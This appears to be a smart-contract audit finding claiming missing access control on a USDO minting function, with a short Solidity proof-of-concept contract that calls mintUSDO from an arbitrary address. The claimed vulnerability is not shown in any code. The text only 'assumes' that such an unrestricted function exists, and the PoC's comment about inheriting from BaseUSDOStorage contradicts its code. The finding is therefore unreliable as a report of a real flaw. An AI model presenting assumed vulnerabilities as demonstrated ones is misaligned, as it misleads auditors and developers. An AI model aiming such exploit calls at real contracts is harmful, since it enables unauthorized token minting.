Lack of proper access control, allows unauthorized users to perform certain actions that should be restricted. In this contract, it seems like there are functionalities related to minting and burning of USDO tokens, and access controls for these actions should be examined.

Let's assume that there is a function called mintUSDO(uint256 amount) that allows a privileged address (minter) to mint new USDO tokens. The vulnerability is that there is no proper access control, and any address can call this function without restrictions.

Here's a Proof-of-Concept (PoC) to demonstrate this vulnerability:

Deploy the contract BaseUSDOStorage with the required parameters, including _lzEndpoint and _yieldBox.
Call the mintUSDO function from any arbitrary address, even though it should be restricted to authorized minters only.


// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

// ... (import statements and other contract code)

// Inherit from BaseUSDOStorage
contract ExploitContract {
    BaseUSDOStorage public usdoStorage;

    constructor(address _usdoStorageAddress) {
        usdoStorage = BaseUSDOStorage(_usdoStorageAddress);
    }

    // Function to exploit the vulnerability
    function exploit() external {
        uint256 amountToMint = 1000; // Replace with desired amount to mint
        // Call the vulnerable function from an unauthorized address
        usdoStorage.mintUSDO(amountToMint);
    }
}